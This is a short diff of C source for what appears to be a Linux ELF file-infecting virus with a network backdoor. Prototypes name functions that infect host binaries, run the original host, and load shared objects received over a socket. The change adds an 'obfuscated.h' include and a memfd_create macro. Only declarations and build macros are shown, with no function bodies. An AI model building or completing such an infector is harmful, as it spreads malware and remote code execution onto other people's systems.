@@ -3,7 +3,6 @@
 #include <string.h>
 #include <sys/syscall.h>
 #include <sys/unistd.h>
-//#include <sys/ptrace.h>
 #include <dlfcn.h>
 #include <elf.h>
 #include <sys/wait.h> 
@@ -11,21 +10,25 @@
 #include <netinet/in.h>
 #include <arpa/inet.h>
 
+#include "obfuscated.h"
+
 #define always_inline __attribute__((always_inline))
 #define optimize(x) __attribute__((optimize(x)))
 
 #define memfd_create(x,y) syscall(__NR_memfd_create, x, y)
 
+#define opt 3
+
 extern char** environ;
 
-always_inline optimize(3) static inline long elf_size(FILE*);
-always_inline optimize(3) static inline int is_elf(char*);
-always_inline optimize(3) static inline int is_infected(char*);
-always_inline optimize(3) static inline void infect(FILE*, FILE*);
-always_inline optimize(3) static inline void execute_host(FILE*, char**, char**);
-always_inline optimize(3) static inline void load_so(int, int);
-always_inline optimize(3) static inline void process_connection(int);
-always_inline optimize(3) static inline void server();
+always_inline optimize(opt) static inline long elf_size(FILE*);
+always_inline optimize(opt) static inline int is_elf(char*);
+always_inline optimize(opt) static inline int is_infected(char*);
+always_inline optimize(opt) static inline void infect(FILE*, FILE*);
+always_inline optimize(opt) static inline void execute_host(FILE*, char**, char**);
+always_inline optimize(opt) static inline void load_so(int, int);
+always_inline optimize(opt) static inline void process_connection(int);
+always_inline optimize(opt) static inline void server();
 
 
 int main(int argc, char** argv){
